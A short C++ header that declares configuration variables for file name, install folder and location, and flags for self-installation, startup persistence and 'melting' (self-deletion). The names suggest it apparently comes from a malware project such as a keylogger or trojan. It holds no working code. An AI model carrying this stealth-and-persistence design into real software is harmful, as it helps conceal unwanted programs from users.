#pragma once


#include <string>

#ifndef SETTINGS_H
#define SETTINGS_H

extern std::string fileName;		//file name
extern std::string folderName;	//folder name
extern std::string installLocation; //install location (appdata, programdata etc)
extern bool installSelf;
extern bool startOnNextBoot;
extern bool meltSelf;
extern bool setStartupSelf;


#endif // !SETTINGS_H